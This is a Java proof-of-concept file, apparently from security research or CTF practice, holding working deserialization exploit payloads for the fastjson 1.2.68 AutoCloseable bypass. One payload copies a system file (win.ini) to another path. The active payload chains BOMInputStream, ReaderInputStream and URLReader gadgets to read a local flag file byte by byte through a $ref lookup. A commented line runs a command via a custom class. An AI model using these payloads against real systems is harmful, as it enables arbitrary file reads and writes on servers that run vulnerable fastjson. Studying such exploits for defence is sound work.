package com.firebasky.fastjson;

import com.alibaba.fastjson.JSON;

public class PoC_1_2_68 {
    public static void main(String[] args) {
        //String poc = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.firebasky.fastjson.VulAutoCloseable\",\"cmd\":\"calc\"}\n";
        String copy ="{\"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\", \"tempPath\":\"C:/Windows/win.ini\", \"targetPath\":\"D:/win.txt\"}";

        String wirte ="[{\n" +
                "    {\n" +
                "        '@type':\"com.alibaba.fastjson.JSONObject\",\n" +
                "        'a':{\n" +
                "    \"abc\": {\n" +
                "        \"@type\": \"java.lang.AutoCloseable\",\n" +
                "        \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
                "        \"delegate\": {\n" +
                "            \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n" +
                "            \"reader\": {\n" +
                "                \"@type\": \"jdk.nashorn.api.scripting.URLReader\",\n" +
                "                \"url\": \"file:///d:/flag.txt\"\n" +
                "            },\n" +
                "            \"charsetName\": \"UTF-8\",\n" +
                "            \"bufferSize\": 1024\n" +
                "        },\n" +
                "        \"boms\": [{\n" +
                "            \"charsetName\": \"UTF-8\",\n" +
                "            \"bytes\": [49]\n" +
                "        }]\n" +
                "    },\n" +
                "    \"address\": {\n" +
                "        \"$ref\": \"$.abc.BOM\"\n" +
                "    }\n" +
                "}\n" +
                "    }:'b'\n" +
                "}]";
        Object parse = JSON.parseArray(wirte);
        //System.out.println(parse);
    }
}
